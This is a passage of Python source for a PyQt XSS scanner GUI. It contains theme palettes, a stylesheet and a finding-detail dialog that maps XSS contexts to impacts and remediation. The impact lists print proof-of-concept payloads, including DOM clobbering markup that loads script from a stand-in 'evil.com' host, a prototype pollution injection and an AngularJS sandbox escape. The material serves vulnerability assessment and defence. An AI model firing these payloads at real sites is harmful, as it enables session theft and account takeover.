        "bg_alt_row":    "#eaecf0",
        "fg":            "#2b323d",   # body text — graphite
        "fg_muted":      "#5c6672",   # captions / secondary — soft gray
        "fg_faint":      "#8b95a2",
        "fg_strong":     "#1a1f28",   # near-black for strongest text
        "fg_btn":        "#333b47",
        "fg_tooltip":    "#1a1f28",
        "fg_table":      "#2b323d",
        "fg_header":     "#3c4551",
        "fg_group":      "#5c6672",
        "border":        "#ccd2da",
        "border_input":  "#bbc3cd",
        "border_subtle": "#dbdfe6",
        "accent":        "#ff2d55",   # brand — RUN btn / STOP / focus / checked only
        "accent_text":   "#2b3440",   # was #cf1640 red → graphite: de-reds all label/value TEXT
        "accent_hover":  "#e02749",   # RUN hover — darker red (presses in)
        "sel_bg":        "#d4dae3",   # neutral gray selection (was pink)
        "sel_fg":        "#1a1f28",
        "scrollbar":     "#c2c9d3",
        "disabled_bg":   "#e1e4ea",   # neutral gray (was pink)
        "disabled_fg":   "#a4acb6",
        "divider":       "#ccd2da",
        "card_sep":      "#dbdfe6",
        "warn_text":     "#a45508",
        "warn_bg":       "#fbf1e2",
        "warn_border":   "#eec089",
    },
}

# Aktivní paleta (mění se přepínačem v Settings). Inline styly čtou theme().
_ACTIVE_THEME_NAME = "dark"
THEME = dict(PALETTES["dark"])


def theme(token: str, default: str = "#000000") -> str:
    """Vrátí barvu aktivní palety pro daný token (pro inline styly)."""
    return THEME.get(token, default)


def set_active_theme(name: str) -> None:
    """Přepne aktivní paletu (dark|light). THEME se přemapuje in-place, ať
    už existující odkazy vidí novou paletu."""
    global _ACTIVE_THEME_NAME
    name = name if name in PALETTES else "dark"
    _ACTIVE_THEME_NAME = name
    THEME.clear()
    THEME.update(PALETTES[name])


def active_theme_name() -> str:
    return _ACTIVE_THEME_NAME


_STYLESHEET_TEMPLATE = _string.Template("""
/* ============================================================
   XSS Grenade — CISO-readable theme (themeable: dark / light)
   Accent #ff2d55 (TX-C0RE) kept across both palettes.
   ============================================================ */

QMainWindow, QWidget {
    background-color: $bg;
    color: $fg;
    font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
    font-size: 15px;
}

/* PANELS */
QWidget#left_panel {
    background-color: $bg;
    border-right: 1px solid $border;
}
QWidget#right_panel { background-color: $bg_alt; }

/* TOOLTIPS */
QToolTip {
    background-color: $bg_tooltip;
    color: $fg_tooltip;
    border: 1px solid $accent;
    border-radius: 7px;
    padding: 7px 10px;
    font-size: 13px;
}

/* TABS */
QTabWidget::pane {
    border: 1px solid $border;
    background-color: $bg_alt;
    top: -1px;
}
QTabBar::tab {
    background-color: $bg_tab;
    color: $fg_muted;
    padding: 11px 16px;
    border: 1px solid $border_subtle;
    border-bottom: 3px solid transparent;
    margin-right: 3px;
    font-size: 14px;
    font-weight: bold;
}
QTabBar::tab:selected {
    color: $fg_strong;
    background-color: $bg_tab_sel;
    border-bottom: 3px solid $accent;
}
QTabBar::tab:hover:!selected { color: $fg; background-color: $bg_tab_hover; }

/* INPUT */
QLineEdit {
    background-color: $bg_input;
    color: $fg;
    border: 1px solid $border_input;
    border-radius: 8px;
    padding: 9px 13px;
    font-size: 15px;
    selection-background-color: $accent;
    selection-color: #fff;
}
QLineEdit:focus {
    border: 1px solid $accent;
    background-color: $bg_input_focus;
}

/* BUTTONS */
QPushButton {
    background-color: $bg_btn;
    color: $fg_btn;
    border: 1px solid $border_input;
    border-radius: 8px;
    padding: 10px 18px;
    font-size: 14px;
}
QPushButton:hover {
    border: 1px solid $accent;
    color: $fg_strong;
    background-color: $bg_btn_hover;
}
QPushButton:pressed {
    background-color: $accent;
    color: #fff;
}

/* PRIMARY (RUN) BUTTON */
QPushButton#btn_start {
    background-color: $accent;
    color: #fff;
    font-weight: bold;
    font-size: 15px;
    padding: 11px 28px;
    border: 1px solid $accent;
}
QPushButton#btn_start:hover { background-color: $accent_hover; border: 1px solid $accent_hover; }
QPushButton#btn_start:disabled {
    background-color: $disabled_bg;
    color: $disabled_fg;
    border: 1px solid $disabled_bg;
}

/* STOP BUTTON */
QPushButton#btn_stop {
    color: $accent;
    border: 1px solid $accent;
    font-weight: bold;
}
QPushButton#btn_stop:hover {
    background-color: $accent;
    color: #fff;
}

/* LIVE OUTPUT / LOG */
QTextEdit {
    background-color: $bg_deep;
    color: $fg_table;
    border-top: 1px solid $bg_input;
    font-size: 14px;
    padding: 10px;
    selection-background-color: $sel_bg;
    selection-color: $sel_fg;
}

/* PROGRESS */
QProgressBar {
    background-color: $bg_input;
    border: 1px solid $border;
    border-radius: 9px;
    text-align: center;
    color: $fg;
}
QProgressBar::chunk {
    background-color: $accent;
    border-radius: 9px;
}

/* TABLES */
QTableWidget {
    background-color: $bg_deep;
    alternate-background-color: $bg_alt_row;
    color: $fg_table;
    gridline-color: $border_subtle;
    font-size: 13px;
}
QTableWidget::item {
    padding: 8px 12px;
    border-bottom: 1px solid $border_subtle;
}
QTableWidget::item:selected {
    background-color: $sel_bg;
    color: $accent_text;
}

/* TABLE HEADER */
QHeaderView::section {
    background-color: $bg_header;
    color: $fg_header;
    padding: 9px 12px;
    border: none;
    border-right: 1px solid $border_subtle;
    border-bottom: 2px solid $accent;
    font-size: 12px;
    font-weight: bold;
    letter-spacing: 1px;
}

/* NUMERIC INPUTS */
QSpinBox, QDoubleSpinBox {
    background-color: $bg_input;
    color: $fg;
    border: 1px solid $border_input;
    border-radius: 7px;
    padding: 6px 9px;
    font-size: 14px;
}
QSpinBox:focus, QDoubleSpinBox:focus {
    border: 1px solid $accent;
}

/* CHECKBOX */
QCheckBox {
    spacing: 9px;
    color: $fg;
    font-size: 14px;
}
QCheckBox::indicator {
    width: 18px;
    height: 18px;
    border: 1px solid $border_input;
    border-radius: 7px;
    background-color: $bg_input;
}
QCheckBox::indicator:hover { border: 1px solid $accent; }
QCheckBox::indicator:checked {
    background-color: $accent;
    border: 1px solid $accent;
}

/* GROUP BOXES */
QGroupBox {
    border: 1px solid $border;
    border-radius: 8px;
    margin-top: 18px;
    padding: 16px 12px 12px 12px;
    color: $fg_group;
    font-size: 12px;
}
QGroupBox::title {
    subcontrol-origin: margin;
    subcontrol-position: top left;
    left: 12px;
    padding: 2px 9px;
    color: $accent_text;
    font-weight: bold;
    letter-spacing: 1px;
    background-color: $bg;
}

/* COMBOBOX (theme selector ad.) */
QComboBox {
    background-color: $bg_input;
    color: $fg;
    border: 1px solid $border_input;
    border-radius: 8px;
    padding: 7px 11px;
    font-size: 14px;
}
QComboBox:focus { border: 1px solid $accent; }
QComboBox QAbstractItemView {
    background-color: $bg_input;
    color: $fg;
    selection-background-color: $accent;
    selection-color: #fff;
    border: 1px solid $border_input;
}

/* STATUS BAR */
QStatusBar {
    background-color: $bg_deep;
    color: $fg_muted;
    border-top: 1px solid $bg_input;
    font-size: 13px;
}

/* SCROLLBARS */
QScrollBar:vertical {
    background-color: $bg_deep;
    width: 12px;
    margin: 2px;
}
QScrollBar::handle:vertical {
    background-color: $scrollbar;
    border-radius: 9px;
    min-height: 30px;
}
QScrollBar::handle:vertical:hover {
    background-color: $accent;
}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0; }
QScrollBar:horizontal {
    background-color: $bg_deep;
    height: 12px;
    margin: 2px;
}
QScrollBar::handle:horizontal {
    background-color: $scrollbar;
    border-radius: 9px;
    min-width: 30px;
}
QScrollBar::handle:horizontal:hover { background-color: $accent; }
QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal { width: 0; }

/* DIVIDERS */
QFrame#h_divider {
    background-color: $border;
    max-height: 1px;
}
QFrame#left_div {
    background-color: $accent;
    max-height: 2px;
}

/* CUSTOM CARDS (v10.29) — themed via objectName so they switch live */
QWidget#stat_card { background-color: $bg_card; border: 1px solid $border; border-radius: 7px; }
QLabel#stat_value { color: $accent_text; font-size: 18px; font-weight: bold; letter-spacing: 1px; background: transparent; border: none; }
QLabel#stat_title { color: $fg_muted; font-size: 10px; letter-spacing: 2px; background: transparent; border: none; }

QWidget#mstat_card { background-color: $bg_card; border: 1px solid $border; border-radius: 2px; }
QLabel#mstat_value { color: $accent_text; font-size: 16px; font-weight: bold; background: transparent; border: none; }
QLabel#mstat_title { color: $fg_muted; font-size: 9px; letter-spacing: 2px; font-weight: bold; background: transparent; border: none; }

QWidget#about_card { background-color: $bg_card; border: 1px solid $border; border-radius: 8px; }
QLabel#about_title { color: $accent_text; font-weight: bold; letter-spacing: 1px; background: transparent; border: none; }
QLabel#about_dot { color: $accent_text; background: transparent; border: none; }
QLabel#about_text { color: $fg_muted; background: transparent; border: none; }

QWidget#help_panel { background-color: $bg_card; border: 1px solid $border; border-radius: 8px; }
QGroupBox#help_panel { background-color: $bg_card; border: 1px solid $border; border-radius: 10px; margin-top: 8px; }
QWidget#help_section { background-color: $bg_alt; border: 1px solid $border_subtle; border-radius: 8px; }

/* BRAND TEXT (v10.29c) — themed wordmark/subtitle/panel headers */
QLabel#brand_wordmark { color: $accent_text; font-size: 26px; font-weight: bold; letter-spacing: 8px; background: transparent; border: none; }
QLabel#brand_subtitle { color: $fg_faint; font-size: 11px; letter-spacing: 3px; background: transparent; border: none; }
QLabel#panel_title { color: $accent_text; font-weight: bold; letter-spacing: 3px; background: transparent; border: none; }
QLabel#panel_sub { color: $fg_muted; background: transparent; border: none; }

/* SETTINGS SECTION HEADERS (v10.65) — themed so they re-color live on switch;
   graphite in light (calm), soft pink in dark. Subtle themed underline, not #333. */
QLabel#settings_section {
    color: $accent_text;
    font-weight: bold;
    font-size: 11px;
    letter-spacing: 1px;
    padding-top: 8px;
    padding-bottom: 3px;
    border-bottom: 1px solid $border_subtle;
    background: transparent;
}

/* INFO BANNER + DESTRUCTIVE INPUT (v10.29d) — themed, readable in both modes */
QLabel#info_banner { padding: 8px; background-color: $bg_alt; border: 1px solid $border_subtle; border-radius: 7px; color: $fg; }
QLineEdit#destructive_input { color: $warn_text; border: 1px solid $warn_border; background: $warn_bg; padding: 4px; }
QLineEdit#destructive_input:disabled { color: $disabled_fg; border: 1px solid $border_input; background: $bg_input; padding: 4px; }

/* SLIM TOP BAR + STAT CHIPS (v10.30 redesign) */
QLabel#brand_compact { color: $accent_text; font-size: 17px; font-weight: bold; letter-spacing: 3px; background: transparent; border: none; }
QWidget#stat_chip { background-color: $bg_card; border: 1px solid $border; border-radius: 9px; }
QLabel#chip_value { color: $accent_text; font-size: 15px; font-weight: bold; background: transparent; border: none; }
QLabel#chip_status { color: $accent_text; font-size: 13px; font-weight: bold; letter-spacing: 1px; background: transparent; border: none; }
QLabel#chip_title { color: $fg_muted; font-size: 11px; letter-spacing: 1px; background: transparent; border: none; }

/* TELEMETRY TILES (v10.30 redesign) — left panel counters */
QWidget#tele_tile { background-color: $bg_card; border: 1px solid $border; border-radius: 9px; }
QLabel#tele_value { color: $accent_text; font-size: 20px; font-weight: bold; background: transparent; border: none; }
QLabel#tele_title { color: $fg_muted; font-size: 10px; letter-spacing: 2px; background: transparent; border: none; }
QLabel#tele_caption { color: $accent_text; font-size: 10px; letter-spacing: 1px; background: transparent; border: none; }
""")


def build_stylesheet(palette: dict) -> str:
    """Sestaví kompletní app stylesheet z palety (substituce $tokenů)."""
    return _STYLESHEET_TEMPLATE.substitute(palette)


# Back-compat: kód odkazuje DARK_STYLESHEET na startu.
DARK_STYLESHEET = build_stylesheet(PALETTES["dark"])



class VulnerabilityDetailDialog(QDialog):
    """
    Modal dialog zobrazující detaily potvrzené XSS zranitelnosti.
    Otevírá se při kliknutí na hit exploit node v AttackGraphWidget.

    Sekce dialogu:
      1. Header — endpoint + parametr + severity badge
      2. Útočný vektor — plná URL + HTTP metoda + kontext reflexe
      3. Payload — monospace block, copy-to-clipboard button
      4. Impact — co může útočník dokázat při exploitaci
      5. Remediation — doporučená oprava
      6. Footer — tlačítka Copy URL / Copy Payload / Zavřít
    """

    # Mapa kontext → (severity, impact text, remediation)
    IMPACT_MAP = {
        "script_body": (
            "CRITICAL",
            "#ff2d55",
            [
                "Full JavaScript execution in page context",
                "Session cookie theft (document.cookie)",
                "Session storage / local storage token theft",
                "Keylogger — capture of passwords, OTPs, card numbers",
                "Account takeover via credential forwarding",
                "Phishing via DOM manipulation (fake login form)",
                "Crypto-jacker — mining in the victim's browser",
                "Browser exploit chains (outdated browsers)",
            ],
            "Escape all user input in <script> context. Use JSON.stringify() "
            "for server-side embedding and a Content-Security-Policy with nonce/hash for inline scripts. "
            "Consider a strict CSP without 'unsafe-inline'."
        ),
        "event_handler": (
            "CRITICAL",
            "#ff2d55",
            [
                "JS execution via onclick/onload/onerror/onmouseover",
                "Identical impact to script_body (session, keylogger, account takeover)",
                "Triggered on user interaction — higher stealth than an immediately-executed script",
                "Often bypasses weaker CSPs with 'unsafe-inline' only for script-src",
            ],
            "Attribute-level escape (HTML attribute encode). Prefer .textContent / "
            ".setAttribute() over innerHTML. Avoid eval(), Function(), setTimeout(string)."
        ),
        "href_attr": (
            "HIGH",
            "#f59e0b",
            [
                "javascript: URI scheme → JS execution on click",
                "data: URI → base64 embedded exploit",
                "Phishing via open redirect to attacker domain",
                "OAuth token leak (Referer header)",
            ],
            "Whitelist allowed URL schemes (http, https, mailto, tel). "
            "Block javascript:, data:, vbscript:, file: schemes. "
            "Use rel='noopener noreferrer' on target='_blank'."
        ),
        "html_attr": (
            "HIGH",
            "#f59e0b",
            [
                "Attribute breakout → HTML injection → full control over the element",
                "Event handler injection (onfocus, onmouseover)",
                "CSS injection → keylogger via CSS selectors",
                "Style-based data exfiltration",
            ],
            "HTML attribute encoding (quotes, apostrophes, etc.). "
            "Sanitizer library (DOMPurify). Validate against an allow-list of permitted attributes."
        ),
        "html_body": (
            "MEDIUM",
            "#fbbf24",
            [
                "Content spoofing — fake administrative messages",
                "Page defacement",
                "Phishing via injected login form",
                "UI redressing (clickjacking via injected iframe)",
                "SEO manipulation — injection of hidden content",
            ],
            "HTML entity encoding of user input (&lt;, &gt;, &amp;, &quot;, &#39;). "
            "Use an output encoding library for your framework (Jinja2 autoescape, React JSX)."
        ),
        "POST": (
            "HIGH",
            "#f59e0b",
            [
                "XSS via POST body — typically form data, APIs",
                "May be stored if the backend persists the data",
                "Harder to exploit (requires CSRF bypass or same-origin)",
                "Impact depends on reflection context (see script_body/html_body above)",
            ],
            "Same principles as for GET parameters — escape by context. "
            "+ CSRF protection (SameSite cookies, CSRF tokens). Content-Type validation."
        ),
        "JSON": (
            "HIGH",
            "#8b5cf6",
            [
                "XSS in JSON API response — React/Vue/Angular SPA applications",
                "Client-side template injection when JSON is rendered via innerHTML",
                "Prototype pollution via __proto__ key (if JSON.parse + merge)",
                "API response cache poisoning",
            ],
            "Response Content-Type: application/json (not text/html). "
            "Framework-level escape — React {variable} escapes, innerHTML does not. "
            "Sanitize before render (DOMPurify when HTML is required)."
        ),
        "HEADER": (
            "MEDIUM",
            "#22c55e",
            [
                "XSS via Referer, X-Forwarded-For, User-Agent header",
                "Response splitting (if \\r\\n is not escaped)",
                "Cache poisoning (host header injection)",
                "Log injection (if logs are rendered in admin UI)",
            ],
            "Validate HTTP header values — reject CRLF (\\r\\n). "
            "Escape headers before displaying them in the UI. "
            "The cache key should include all relevant headers."
        ),
        "dom-dynamic": (
            "HIGH",
            "#ec4899",
            [
                "Pure DOM-based XSS — the server response is safe, but client-side JS exploits it",
                "Bypasses server-side WAF (the payload is never sent to the server)",
                "document.location, document.URL, location.hash sinks",
                "innerHTML / outerHTML / document.write() with user input",
            ],
            "Audit client-side JS for dangerous sinks. Use the Trusted Types API. "
            "DOMPurify for sanitization before innerHTML. Prefer textContent."
        ),
        # ── v4: Template injection (Angular/Vue/Handlebars sandbox escape) ──
        "template_injection": (
            "CRITICAL",
            "#a855f7",   # purple
            [
                "Client-side template injection — the framework evaluates the expression as JS",
                "May contain no HTML at all (no <script>, no on*=) → bypasses naive WAFs",
                "AngularJS sandbox bypass: {{constructor.constructor('alert(1)')()}}",
                "Vue v-html injection: <span v-html=\"userInput\"> + payload",
                "Handlebars {{#with}} sandbox escape (server-side Node.js)",
                "Full JS execution in page context (same impact as script_body)",
                "Often overlooked by sanitizers — text-based filters don't block {{...}}",
            ],
            "Server-side: NEVER reflect user input into template syntax. "
            "Vue: <span>{{user}}</span> uses automatic escaping; v-html is dangerous. "
            "AngularJS: Migrate to Angular 2+ where the sandbox doesn't exist (it raises an exception). "
            "For Angular 2+: use DomSanitizer.sanitize() instead of bypassSecurityTrust*. "
            "Audit every place where user data flows into the template engine."
        ),
        # ── v4: Mutation XSS — sanitizer + innerHTML pattern ──
        "mutation-xss-static": (
            "MEDIUM",
            "#ec4899",   # pink
            [
                "Page combines a sanitizer (DOMPurify/sanitize-html) + innerHTML — a pattern prone to mXSS",
                "The sanitizer parses the HTML once, the browser re-parses it on innerHTML assignment",
                "Re-parsing can mutate 'clean' HTML back into an exploitable form",
                "Known vectors: SVG namespace tricks, MathML foreign content, noscript boundary",
                "This is a STATIC ASSESSMENT — requires manual verification in a browser",
                "Real exploitation requires knowing the specific sanitizer config and version",
            ],
            "Manual verification: take the mXSS payload bank from _mutation_xss.py "
            "and feed each payload into the sanitizer → innerHTML in Playwright/headless. "
            "Hook window.alert, watch for the dialog. "
            "Defense: use the Trusted Types API, minimize innerHTML usage, "
            "prefer textContent + a DOM-based approach. If a sanitizer is required, "
            "keep it on the latest version (DOMPurify gets bypasses regularly)."
        ),
        # ── v6: DOM taint analysis (runtime in Chromium) ──
        "dom-v6-taint": (
            "HIGH",
            "#0d9488",   # darker teal
            [
                "DOM-based XSS — source→sink chain reconstructed in Chromium",
                "Browser hooks captured a read of tainted data (URL/cookies/postMessage)",
                "The tainted values then ended up in an exec sink (innerHTML/eval/Function/...)",
                "The server-side response is clean — the vulnerability is purely in client-side JS",
                "Bypasses server-side WAF (the payload is never sent to the server)",
                "May not be reflected in the body — the JS reads the parameter from location.search/hash itself",
                "Twitter-style #! XSS, sudo level19 patterns — this IS that case",
            ],
            "Audit JS source where data flows from the URL into the DOM. Use the Trusted Types API. "
            "Sanitize user input before assignment to innerHTML — prefer textContent. "
            "If the framework does interpolation (Vue v-html, Angular [innerHTML]), "
            "explicitly sanitize before injection. For location.hash patterns: parse only "
            "expected formats (whitelisting), never raw eval/innerHTML with user data."
        ),
        # ── v7: Static JS taint (AST analysis) ──
        "static-js-taint": (
            "HIGH",
            "#0891b2",   # teal
            [
                "Static analysis found a source→sink chain in the JS source code",
                "Tainted data flows from a DOM source (location.*, document.*, storage)",
                "...through possible transformations (slice, atob, replace, ...)",
                "...into an exec sink (innerHTML, eval, Function, document.write, jQuery .html)",
                "Detected without running the JS — the chain is found via AST analysis",
                "This is a BUG in the JS source — an explicit code path",
                "Manual audit with the file:line:col location from the finding",
            ],
            "Open the listed JS file at the line from the finding. Audit the function/handler around it. "
            "Replace innerHTML with textContent where possible. For genuinely required HTML "
            "injection, use DOMPurify (or framework-native sanitization). "
            "For eval/Function — rewrite the logic so it doesn't need arbitrary code "
            "execution (typically JSON.parse instead of eval(jsonString)). "
            "The Trusted Types API blocks this pattern globally."
        ),
        # ── v8: Trusted Types CSP misconfiguration ──
        "trusted-types-csp": (
            "HIGH",
            "#d97706",   # dark amber
            [
                "Trusted Types in the CSP is misconfigured — a defense bypass",
                "TT is a W3C standard; Firefox 148 (2/2026) enabled it by default",
                "Google/Stripe run it in production; it eliminates DOM XSS",
                "Detected CSP errors indicate TT isn't actually being enforced",
                "Wildcard (trusted-types *) — anyone can create a policy with any name",
                "Report-only mode — violations are logged but don't block the attack",
                "A default policy in the allowlist — implicit conversion can be a backdoor",
            ],
            "Tighten the CSP: Content-Security-Policy: require-trusted-types-for 'script'; "
            "trusted-types <specific-names>; (NOT a wildcard, NOT Report-Only-only). "
            "Audit createPolicy() definitions — a pass-through createHTML is a silent "
            "backdoor. Use DOMPurify with {RETURN_TRUSTED_TYPE: true} as createHTML. "
            "Never define a 'default' policy — if you must, send every input through DOMPurify."
        ),
        # ── v8: Trusted Types policy audit (createPolicy() body insecure) ──
        "trusted-types-policy": (
            "HIGH",
            "#d97706",
            [
                "A createPolicy() definition contains an insecure transformer function",
                "Pass-through (input) => input — a silent backdoor, performs no sanitization",
                "Weak regex (.replace(/<script>/, '')) — bypassable in dozens of ways",
                "If this policy is 'default' — all string-to-sink conversions pass without protection",
                "The browser is now blind: it sees a TrustedHTML wrapper, but the content is still dangerous",
                "Attacker: find a sink + inject a payload → the policy passes it → exec",
                "This is the worst type of TT error: a false sense of security",
            ],
            "Replace the transformer with DOMPurify.sanitize(input, {RETURN_TRUSTED_TYPE: true}) "
            "— battle-tested, supports TT natively. For createScript: don't pass user input "
            "at all, use an allowlist of specific string constants. For createScriptURL: "
            "URL.parse() + check the origin against an allowlist. Avoid the 'default' policy — "
            "explicit policy names enable per-call audit and easier code review."
        ),
        # ── v9: Stored XSS round-trip (multi-canary persistence) ──
        "stored-roundtrip": (
            "HIGH",
            "#ec4899",   # pink — persistence pattern
            [
                "Stored XSS — the payload is saved on the server (DB/file/cache)",
                "Then it's rendered on a DIFFERENT page than where it was POSTed",
                "The attacker doesn't send the payload to the victim directly — the victim fetches it themselves",
                "Classic pattern: comment in DB → admin panel displays it → exec",
                "If the reflection is in an admin context → SEVERITY CRITICAL",
                "Admin compromise = full ATO (Account Takeover) of the entire organization",
                "An existing reflective XSS scanner won't find this — a new URL for the reflection",
                "HackerOne 2025: Stored XSS dominates the top reports (Rockstar $1k, "
                "Shopify $3k, Mail.ru, TikTok, IBM)",
            ],
            "Multi-layer defense: 1) Output encoding by context (HTML, JS, "
            "URL, CSS) at render time. 2) Strict CSP (script-src 'self' + nonces). "
            "3) Trusted Types for DOM sinks. 4) For user-generated content: "
            "DOMPurify.sanitize() before render. 5) Admin pages: a separate origin/CSP, "
            "no user-controlled HTML interpolation. 6) Audit every endpoint that "
            "renders user content (comments, profiles, search history, logs, "
            "support tickets). Manual test: send a unique marker into EVERY "
            "POST/PUT input, then inspect ALL admin/dashboard URLs."
        ),
        # ── v10: Prototype Pollution → XSS via DOMPurify (data-driven CVE feed) ──
        # v10.10: This is the GENERIC context for any DOMPurify CVE chain.
        # Specific CVE details (id, vector, description, PoC payload, reference)
        # are rendered separately by detail dialog from finding_dict metadata.
        "proto-pollution-cve": (
            "CRITICAL",
            "#7c2d12",   # dark brown — known CVE chain
            [
                "DOMPurify Prototype Pollution chain — a known CVE pattern",
                "The application has TWO vulnerabilities combined = a full sanitization bypass",
                "Source: a recursive merge function with user-controlled input "
                "(lodash.merge, $.extend(true), deepmerge, custom for-in)",
                "Sink: DOMPurify.sanitize() with a vulnerable version (see the specific CVE detail)",
                "The attacker uses PP to pollute Object.prototype properties that DOMPurify reads",
                "DOMPurify then allows payloads it would normally block",
                "Currently known CVEs (see _dompurify_cve_feed.py):",
                "  • CVE-2024-47875 (high) — mXSS via SVG namespace (DOMPurify 3.0.0-3.1.6)",
                "  • CVE-2025-26791 (high) — Template literal escape (DOMPurify 3.0.0-3.2.3)",
                "  • CVE-2026-41238 (critical) — PP bypass via CUSTOM_ELEMENT_HANDLING "
                "(DOMPurify 3.0.1-3.3.9)",
                "The engine detects ALL matching CVEs for the detected version",
                "DOMPurify has 24M+ weekly downloads, used by GitHub/Notion/Slack/Discord",
            ],
            "URGENT REMEDIATION: 1) Upgrade DOMPurify to a patched version (see the CVE detail "
            "in the report — 3.1.7 for 47875, 3.2.4 for 26791, 3.4.0 for 41238). "
            "2) Audit all recursive merge calls — never merge user input into "
            "objects with a prototype. Use Object.create(null), an explicit __proto__/"
            "constructor/prototype filter, or Object.freeze(Object.prototype). "
            "3) If an immediate upgrade isn't possible: an explicit DOMPurify config "
            "with CUSTOM_ELEMENT_HANDLING: { tagNameCheck: null, attributeNameCheck: null }. "
            "4) Audit the dependency tree for other PP gadgets — lodash<4.17.11, jQuery deep "
            "extend, query-string parsers (qs/extended). 5) Test probe: "
            "?__proto__[XSGS_PP]=PWNED → if Object.prototype.XSGS_PP === 'PWNED' "
            "in Chromium DevTools after loading = the source is client-side reachable."
        ),
        "proto-pollution-chain": (
            "HIGH",
            "#b91c1c",   # red — generic chain
            [
                "Prototype Pollution → XSS chain — a generic pattern",
                "Source: a recursive merge function with user-controlled input",
                "Gadget: code that reads a property from an object WITHOUT an own-property check",
                "If the attacker pollutes Object.prototype.<gadgetName>, its value flows into the sink",
                "Classic pattern: ?__proto__[innerHTML]=<img src=x onerror=alert(1)>",
                "The application then: render(opts) { container.innerHTML = opts.innerHTML; }",
                "opts has no own innerHTML, the prototype supplies the attacker's value → XSS exec",
                "Known gadgets: innerHTML, transport_url, src, sanitize=false, isAdmin=true",
                "A single source in the application can enable an exploit across many gadgets",
                "Server-side PP can lead to RCE (Express PP, child_process gadgets)",
            ],
            "1) Audit pollution sources — replace lodash.merge older than 4.17.11, $.extend(true) "
            "with a safe alternative. For a custom merge: always filter __proto__/constructor/"
            "prototype keys. 2) Audit gadgets — code reading a property from an unowned object "
            "should first do an Object.prototype.hasOwnProperty.call(obj, prop) check. "
            "3) Use Object.create(null) for config objects (no prototype = no pollution). "
            "4) Object.freeze(Object.prototype) globally before running user JS. "
            "5) JSON.parse is safe (not pollutable), prefer it over custom parsers. "
            "6) Server-side: bodyParser with extended:false, qs with allowPrototypes:false."
        ),
        # ── v10.4: DOM Clobbering → XSS chain (Intigriti March 2026 CTF) ──
        "dom-clobbering": (
            "HIGH",
            "#9333ea",   # purple — modern sanitizer-bypass chain
            [
                "DOM Clobbering → XSS chain (2026 mainstream attack vector)",
                "Documented: Intigriti March 2026 CTF, Cure53 ongoing research",
                "Two-component vulnerability:",
                "  A) Sanitizer (DOMPurify/sanitize-html) doesn't strip name/id/for attributes",
                "  B) JS code reads property from unowned global like window.X.dataset.next",
                "Attacker injects <form name=\"X\" data-next=\"//evil.com\"> via sanitized input",
                "Browser auto-creates window.X pointing to the form element",
                "App reads window.X.dataset.next, gets attacker-controlled URL → XSS/redirect",
                "PoC payloads:",
                "  <form name=\"authConfig\" data-next=\"//evil.com\" data-append=\"true\">",
                "  <a id=\"loginUrl\" href=\"javascript:alert(1)\">",
                "  <iframe name=\"appConfig\" srcdoc=\"<a id='scriptUrl' href='//evil.com/x.js'>\">",
                "Why DOMPurify doesn't help: name/id/for are NOT in default FORBID_ATTR list",
                "Why CSP doesn't help: clobbered values flow through trusted JS code",
            ],
            "REMEDIATION: 1) Sanitizer config: ALWAYS pass FORBID_ATTR: ['name', 'id', 'for'] "
            "to DOMPurify.sanitize(). For Sanitizer API: explicit allow-list only. "
            "2) Code audit: any `window.X` / `document.X` lookup where X is not a built-in "
            "(localStorage, location, etc.) needs typeof check: "
            "   if (typeof window.X === 'object' && window.X.constructor === Object) "
            "3) Use `Object.hasOwn(window, 'X')` to verify ownership before access. "
            "4) Defensive pattern: const config = window.appConfig || {}; doesn't help — "
            "an HTMLFormElement IS truthy. Required: explicit type assertion. "
            "5) Modern frameworks (React/Vue/Angular component state) are largely immune — "
            "vulnerability concentrates in legacy jQuery/vanilla apps + custom config systems."
        ),
        # ── v10.5: SSR Hydration XSS — CVE-2026-27902 family ──
        "ssr-hydration-cve": (
            "CRITICAL",
            "#7c2d12",   # tmavě hnědá — known CVE chain
            [
                "SSR Hydration XSS — known CVE in framework version",
                "Server-Side Rendering frameworks embed JSON state into initial HTML",
                "Bug in serialization → JSON breaks out of HTML comment / <script> context",
                "XSS executes BEFORE client-side JS loads (pre-hydration)",
                "Bypasses CSP-via-meta (HTTP CSP header still effective)",
                "Bypasses Trusted Types policies (not yet active)",
                "Known CVEs detected:",
                "  • CVE-2026-27902 (Svelte 5.53.0-5.53.4) — transformError comment break",
                "    Pattern: <!--{\"error\":\"-->BAD_SCRIPT<!--\"}-->",
                "  • CVE-2026-27125 (Svelte 5.x <5.51.5) — attribute spread mXSS",
                "  • CVE-2024-45047 (Svelte <4.2.19) — noscript attribute mXSS",
                "PoC for CVE-2026-27902:",
                "  Trigger error inside SSR error boundary with attacker-controlled",
                "  string containing '-->'. Result: <!--{...-->payload<!--...-->",
                "  Browser: comment 1 ends prematurely, payload renders as DOM, XSS exec",
            ],
            "URGENT REMEDIATION: 1) Upgrade framework version IMMEDIATELY. "
            "Svelte 5.53.5+ for CVE-2026-27902, 5.51.5+ for CVE-2026-27125, "
            "4.2.19+ for CVE-2024-45047. 2) Audit all SSR error boundary handlers — "
            "ensure user input doesn't flow into transformError. 3) For now: implement "
            "transformError hook that escapes --> as \\u002d\\u002d> in error messages. "
            "4) HTTP-header CSP (not meta tag) — the meta tag CSP doesn't apply pre-"
            "hydration. 5) Audit all SSR frameworks for similar comment-context bugs — "
            "this class is wide and 2026-active research area."
        ),
        "ssr-hydration-injection": (
            "HIGH",
            "#dc2626",   # red — pattern detected in initial HTML
            [
                "SSR Hydration injection pattern detected in initial HTML",
                "One of three injection contexts triggered:",
                "  (A) Comment-break: <!--{...-->ATTACKER<!--...-->",
                "      JSON inside HTML comment was prematurely closed by --> in JSON string",
                "      Pattern matches CVE-2026-27902 (Svelte) — also affects custom SSR",
                "  (B) Script-break: <script type=\"application/json\">{\"x\":\"</script>...\"}",
                "      JSON inside <script> contains literal </script> — script context broken",
                "      Browser closes script tag at first </script>, attacker JS follows",
                "  (C) Reflected canary: user input found inside hydration JSON",
                "      Pre-hydration XSS surface — payload executes before client JS",
                "All three patterns enable XSS BEFORE client-side defenses load",
                "Bypasses meta-tag CSP, bypasses Trusted Types (not yet active)",
                "Affects: Next.js, SvelteKit, Nuxt, Remix, Astro, custom SSR systems",
            ],
            "REMEDIATION: 1) JSON serialization helpers MUST escape: "
            "  --> as \\u002d\\u002d>"
            "  </ as <\\/  (specifically </script> as <\\/script>)"
            "  <!-- as \\u003c!--"
            "  No exceptions. Don't roll your own — use battle-tested helpers like "
